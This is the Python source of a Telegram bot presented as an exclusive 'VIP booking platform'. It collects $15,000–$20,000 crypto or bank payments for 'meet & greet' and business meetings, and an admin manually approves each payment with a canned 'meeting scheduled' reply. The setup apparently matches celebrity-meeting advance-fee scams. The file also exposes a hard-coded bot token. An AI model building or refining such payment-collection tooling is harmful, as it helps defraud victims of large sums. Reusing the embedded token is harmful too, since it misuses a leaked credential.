from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
import sqlite3
from datetime import datetime, timedelta
import os
import threading
import urllib.request
import json
from flask import Flask

# ================= RENDER HEARTBEAT =================
server = Flask(__name__)
@server.route('/')
def health_check(): return "Alive", 200

# ================= SETTINGS =================
TOKEN = "8681446523:AAHs42JckBFG_n-OYsASEbv-6Q4eFUlE5tw"
ADMIN_IDS = [7936558915]

def is_admin(user_id): return user_id in ADMIN_IDS

# ================= BTC PRICE CONVERTER =================
def get_btc_amount(usd_amount):
    try:
        url = "https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        response = urllib.request.urlopen(req)
        data = json.loads(response.read())
        btc_price = float(data['price'])
        return f"{round(usd_amount / btc_price, 6)} BTC"
    except Exception:
        return f"${usd_amount} (BTC equivalent)"

# ================= DATABASE =================
conn = sqlite3.connect("bot.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, blocked INTEGER DEFAULT 0)")
cursor.execute("CREATE TABLE IF NOT EXISTS wallets (coin TEXT PRIMARY KEY, address TEXT, memo TEXT, network TEXT, guide TEXT)")
cursor.execute("CREATE TABLE IF NOT EXISTS settings (id INTEGER PRIMARY KEY, rej_msg TEXT, app_msg TEXT, price_meet INTEGER, price_biz INTEGER)")

# Ensure columns exist for updates
try: cursor.execute("ALTER TABLE wallets ADD COLUMN network TEXT")
except: pass
try: cursor.execute("ALTER TABLE wallets ADD COLUMN guide TEXT")
except: pass

default_app = "🎉 **Payment Confirmed Successfully**\n\n━━━━━━━━━━━━━━━━━━\n👑 **VIP CONFIRMATION NOTICE**\n━━━━━━━━━━━━━━━━━━\n\nDear User,\n\nYour payment has been successfully verified. Your exclusive meeting is now officially scheduled.\n\n📅 **Date:** {date}\n\nThank you for your trust."
cursor.execute("INSERT OR IGNORE INTO settings (id, price_meet, price_biz, app_msg) VALUES (1, 15000, 20000, ?)", (default_app,))
conn.commit()

def get_wallet(coin):
    cursor.execute("SELECT address, memo, network, guide FROM wallets WHERE coin=?", (coin,))
    row = cursor.fetchone()
    return row if row else ("NOT SET", "", "Default", None)

def get_prices():
    cursor.execute("SELECT price_meet, price_biz FROM settings WHERE id=1")
    res = cursor.fetchone()
    return res if res else (15000, 20000)

def is_blocked(user_id):
    cursor.execute("SELECT blocked FROM users WHERE user_id=?", (user_id,))
    row = cursor.fetchone()
    return row[0] == 1 if row else False

# ================= START =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_blocked(user.id): return

    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user.id,))
    conn.commit()

    if not is_admin(user.id):
        username = f"@{user.username}" if user.username else "No Username"
        for admin in ADMIN_IDS:
            try: await context.bot.send_message(admin, f"🔔 **New User:** {user.first_name}\nID: `{user.id}`", parse_mode="Markdown")
            except: pass

    keyboard = [[InlineKeyboardButton("🎯 Book Meeting", callback_data="book")]]
    if is_admin(user.id):
        keyboard.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin_panel")])
        
    welcome_text = (
        f"Greetings, **{user.first_name}**.\n\n"
        "Welcome to our exclusive VIP booking platform. We are dedicated to providing you with a premium scheduling experience.\n\n"
        "Please select the option below to proceed."
    )
    await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")

# ================= CALLBACKS =================
async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    if not is_admin(user_id) and is_blocked(user_id): return
    await query.answer()
    data = query.data

    if data.startswith("copy_"):
        val = data.replace("copy_", "")
        await query.message.reply_text(f"`{val}`", parse_mode="MarkdownV2")
        return

    # ADMIN PANEL
    if data == "admin_panel" and is_admin(user_id):
        kb = [[InlineKeyboardButton("💰 Prices", callback_data="edit_prices"), InlineKeyboardButton("💳 Wallets", callback_data="wallet_menu")],
              [InlineKeyboardButton("💬 DM User", callback_data="dm_user"), InlineKeyboardButton("🚫 Block Manager", callback_data="block_mgmt")],
              [InlineKeyboardButton("✅ Edit Approval", callback_data="set_app_msg"), InlineKeyboardButton("❌ Edit Reject", callback_data="set_rej_msg")],
              [InlineKeyboardButton("📢 Broadcast", callback_data="broadcast")]]
        await query.edit_message_text("📊 **Admin Panel**", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data == "wallet_menu" and is_admin(user_id):
        kb = [[InlineKeyboardButton(c, callback_data=f"manage_{c}") for c in ["BTC", "ETH"]],
              [InlineKeyboardButton(c, callback_data=f"manage_{c}") for c in ["USDT", "Bank"]],
              [InlineKeyboardButton("⬅️ Back", callback_data="admin_panel")]]
        await query.edit_message_text("Select asset:", reply_markup=InlineKeyboardMarkup(kb))

    elif data.startswith("manage_") and is_admin(user_id):
        coin = data.split("_")[1]
        addr, memo, net, guide = get_wallet(coin)
        kb = [[InlineKeyboardButton("📝 Address", callback_data=f"setaddr_{coin}"), InlineKeyboardButton("📝 Memo", callback_data=f"setmemo_{coin}")],
              [InlineKeyboardButton("🌐 Network ✅", callback_data=f"setnet_{coin}"), InlineKeyboardButton("📘 Guide ✅", callback_data=f"setguide_{coin}")],
              [InlineKeyboardButton("⬅️ Back", callback_data="wallet_menu")]]
        await query.edit_message_text(f"💎 **{coin}**\nNet: `{net}`\nAddr: `{addr}`", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data.startswith(("setaddr_", "setmemo_", "setnet_", "setguide_")):
        action, coin = data.split("_")
        field = {"setaddr": "address", "setmemo": "memo", "setnet": "network", "setguide": "guide"}[action]
        context.user_data["edit_target"] = (coin, field)
        await query.edit_message_text(f"📥 Send new **{field}** for {coin}:")

    # USER UI
    elif data == "book":
        p1, p2 = get_prices()
        kb = [[InlineKeyboardButton(f"Meet & Greet (${p1})", callback_data="type_meet")], [InlineKeyboardButton(f"Business (${p2})", callback_data="type_business")]]
        await query.edit_message_text("Choose meeting type:", reply_markup=InlineKeyboardMarkup(kb))

    elif data in ["type_meet", "type_business"]:
        context.user_data["meeting_type"] = "Meet & Greet" if data == "type_meet" else "Business"
        context.user_data["step"] = "reason"
        await query.edit_message_text("Send your reason for the meeting:")

    elif data.startswith("pay_"):
        coin = data.split("_")[1]
        p_meet, p_biz = get_prices()
        m_type = context.user_data.get("meeting_type", "Meet & Greet")
        price = p_meet if m_type == "Meet & Greet" else p_biz
        addr, memo, net, guide = get_wallet(coin)

        display_price = get_btc_amount(price) if coin == "BTC" else f"${price}"
        kb = [[InlineKeyboardButton("📋 Copy Address", callback_data=f"copy_{addr}")]]
        if memo: kb.append([InlineKeyboardButton("📋 Copy Memo", callback_data=f"copy_{memo}")])
        kb.append([InlineKeyboardButton("📘 Payment Guide", callback_data=f"guide_{coin}")])
        kb.append([InlineKeyboardButton("✅ Confirm Payment", callback_data="confirm_payment")])
        
        await query.message.reply_text(f"🧾 **Invoice**\nCoin: {coin}\nNet: {net}\nPrice: {display_price}\n\n`{addr}`", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

    elif data.startswith("guide_"):
        coin = data.split("_")[1]
        _, _, net, guide = get_wallet(coin)
        await query.message.reply_text(guide if guide else f"Send {coin} via {net} network.")

    elif data == "confirm_payment":
        for admin in ADMIN_IDS:
            kb = [[InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"), InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")]]
            try: await context.bot.send_message(admin, f"🧾 **Payment Alert**\nUser: `{user_id}`", reply_markup=InlineKeyboardMarkup(kb))
            except: pass
        await query.edit_message_text("⏳ Awaiting admin approval...")

    elif data.startswith(("approve_", "reject_")) and is_admin(user_id):
        action, target = data.split("_")
        field = "app_msg" if action == "approve" else "rej_msg"
        cursor.execute(f"SELECT {field} FROM settings WHERE id=1")
        msg = cursor.fetchone()[0] or "Update on your request."
        if action == "approve": msg = msg.replace("{date}", (datetime.now() + timedelta(days=5)).strftime('%Y-%m-%d'))
        try:
            await context.bot.send_message(target, msg, parse_mode="Markdown")
            await query.edit_message_text(f"Done: {action.upper()}")
        except: await query.edit_message_text("Failed to notify user.")

# ================= HANDLERS =================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id) and is_blocked(user_id): return
    text = update.message.text
    
    if is_admin(user_id) and "edit_target" in context.user_data:
        coin, field = context.user_data.pop("edit_target")
        cursor.execute(f"INSERT INTO wallets (coin, {field}) VALUES (?, ?) ON CONFLICT(coin) DO UPDATE SET {field}=excluded.{field}", (coin, text))
        conn.commit()
        await update.message.reply_text(f"✅ {coin} {field} updated!")
        return

    if context.user_data.get("step") == "reason":
        context.user_data["reason_text"] = text
        context.user_data["step"] = None
        kb = [[InlineKeyboardButton(c, callback_data=f"pay_{c}") for c in ["BTC", "ETH", "USDT", "Bank"]]]
        await update.message.reply_text("Choose payment method:", reply_markup=InlineKeyboardMarkup(kb))
        return

    if not is_admin(user_id):
        for admin in ADMIN_IDS:
            kb = [[InlineKeyboardButton("↩️ Reply", callback_data=f"reply_{user_id}")]]
            try:
                await context.bot.send_message(admin, f"📩 **Message from {update.effective_user.first_name}:**\n{text}", reply_markup=InlineKeyboardMarkup(kb))
            except: pass

# ================= EXECUTION =================
if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    threading.Thread(target=lambda: server.run(host='0.0.0.0', port=10000), daemon=True).start()
    print("🚀 Bot is live...")
    app.run_polling(drop_pending_updates=True)
